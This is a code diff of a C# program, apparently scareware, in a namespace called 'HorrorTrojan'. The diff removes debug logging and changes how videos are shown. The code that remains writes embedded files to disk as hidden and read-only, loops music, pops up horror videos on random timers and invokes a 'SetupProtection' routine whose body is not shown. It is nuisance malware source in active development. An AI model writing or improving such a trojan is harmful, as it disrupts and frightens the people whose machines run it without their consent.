@@ -47,69 +47,28 @@ namespace HorrorTrojan
         private WindowsMediaPlayer musicPlayer;
 
         private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
-        private string logPath = @"C:\Windows\Temp\virus_log.txt";
-
-        private void Log(string msg)
-        {
-            try { File.AppendAllText(logPath, $"{DateTime.Now:HH:mm:ss} - {msg}\n"); } catch { }
-        }
 
         public MainInterface()
         {
-            Log("=== Конструктор формы ===");
             InitializeComponent();
-            Log("InitializeComponent выполнен");
             this.Load += MainInterface_Load;
-            Log("Подписан Load");
         }
 
         private void MainInterface_Load(object sender, EventArgs e)
         {
-            Log("=== LOAD ===");
-            try
-            {
-                Log("Принудительный показ формы");
-                this.WindowState = FormWindowState.Normal;
-                this.Show();
-                this.BringToFront();
-                this.Focus();
-                Log("Форма показана");
+            if (!Directory.Exists(appDataPath))
+                Directory.CreateDirectory(appDataPath);
 
-                if (!Directory.Exists(appDataPath))
-                {
-                    Log("Создание папки: " + appDataPath);
-                    Directory.CreateDirectory(appDataPath);
-                }
+            ExtractMediaFile("hr.gif");
+            ExtractMediaFile("dv.mp3");
+            ExtractMediaFile("vd.mp4");
+            ExtractMediaFile("kj.mp4");
+            ExtractMediaFile("kf.mp4");
 
-                Log("Извлечение медиа-файлов...");
-                ExtractMediaFile("hr.gif");
-                ExtractMediaFile("dv.mp3");
-                ExtractMediaFile("vd.mp4");
-                ExtractMediaFile("kj.mp4");
-                ExtractMediaFile("kf.mp4");
-                Log("Медиа-файлы извлечены");
-
-                Log("Загрузка ресурсов...");
-                LoadResources();
-                Log("Ресурсы загружены");
-
-                Log("Запуск таймеров...");
-                StartTimers();
-                Log("Таймеры запущены");
-
-                Log("Защита...");
-                SetupProtection();
-                Log("Защита включена");
-
-                Log("Музыка...");
-                PlayMusic();
-                Log("Музыка запущена");
-            }
-            catch (Exception ex)
-            {
-                Log($"ОШИБКА: {ex.Message}\n{ex.StackTrace}");
-                MessageBox.Show($"Ошибка в Load: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
+            LoadResources();
+            StartTimers();
+            SetupProtection();
+            PlayMusic();
         }
 
         private void ExtractMediaFile(string fileName)
@@ -118,10 +77,7 @@ namespace HorrorTrojan
             {
                 string filePath = Path.Combine(appDataPath, fileName);
                 if (File.Exists(filePath))
-                {
-                    Log($"Файл уже существует: {filePath}");
                     return;
-                }
 
                 using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fileName))
                 {
@@ -131,18 +87,10 @@ namespace HorrorTrojan
                         stream.Read(data, 0, data.Length);
                         File.WriteAllBytes(filePath, data);
                         File.SetAttributes(filePath, FileAttributes.Hidden | FileAttributes.ReadOnly);
-                        Log($"Файл извлечён: {filePath}");
-                    }
-                    else
-                    {
-                        Log($"Ресурс {fileName} не найден!");
                     }
                 }
             }
-            catch (Exception ex)
-            {
-                Log($"Ошибка извлечения {fileName}: {ex.Message}");
-            }
+            catch { }
         }
 
         private void LoadResources()
@@ -150,24 +98,20 @@ namespace HorrorTrojan
             try
             {
                 string gifPath = Path.Combine(appDataPath, "hr.gif");
-                Log($"Поиск GIF: {gifPath}");
                 if (File.Exists(gifPath))
                 {
                     gifImage = Image.FromFile(gifPath);
                     this.pictureBox.Image = gifImage;
                     this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
                     ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
-                    Log("GIF загружен");
                 }
                 else
                 {
-                    Log("GIF НЕ НАЙДЕН");
                     this.pictureBox.BackColor = Color.Red;
                 }
             }
-            catch (Exception ex)
+            catch
             {
-                Log($"Ошибка LoadResources: {ex.Message}");
                 this.pictureBox.BackColor = Color.Red;
             }
         }
@@ -177,7 +121,6 @@ namespace HorrorTrojan
             try
             {
                 string musicPath = Path.Combine(appDataPath, "dv.mp3");
-                Log($"Поиск музыки: {musicPath}");
                 if (File.Exists(musicPath))
                 {
                     musicPlayer = new WindowsMediaPlayer();
@@ -185,17 +128,9 @@ namespace HorrorTrojan
                     musicPlayer.settings.autoStart = true;
                     musicPlayer.settings.setMode("loop", true);
                     musicPlayer.controls.play();
-                    Log("Музыка играет");
-                }
-                else
-                {
-                    Log("Музыка НЕ НАЙДЕНА");
                 }
             }
-            catch (Exception ex)
-            {
-                Log($"Ошибка PlayMusic: {ex.Message}");
-            }
+            catch { }
         }
 
         private void StartTimers()
@@ -211,7 +146,6 @@ namespace HorrorTrojan
             videoTimer.Interval = rnd.Next(50000, 120000);
             videoTimer.Tick += VideoTimer_Tick;
             videoTimer.Start();
-            Log("Таймеры запущены");
         }
 
         private void MainTimer_Tick(object sender, EventArgs e)
@@ -302,28 +236,23 @@ namespace HorrorTrojan
                     return;
                 }
 
-                var videoThread = new Thread(() =>
+                // ОТДЕЛЬНАЯ ФОРМА ДЛЯ ВИДЕО
+                VideoForm videoForm = new VideoForm(videoPath);
+                videoForm.Show();
+                
+                // Ждем 5 секунд и закрываем
+                var closeThread = new Thread(() =>
                 {
-                    try
+                    Thread.Sleep(5000);
+                    videoForm.BeginInvoke((Action)(() =>
                     {
-                        Process.Start(new ProcessStartInfo
-                        {
-                            FileName = videoPath,
-                            UseShellExecute = true,
-                            CreateNoWindow = true,
-                            WindowStyle = ProcessWindowStyle.Maximized
-                        });
-                        Thread.Sleep(5000);
-                    }
-                    catch { }
-                    finally
-                    {
+                        videoForm.Close();
                         isVideoActive = false;
                         videoTimer.Start();
-                    }
+                    }));
                 });
-                videoThread.IsBackground = true;
-                videoThread.Start();
+                closeThread.IsBackground = true;
+                closeThread.Start();
             }
             catch
             {
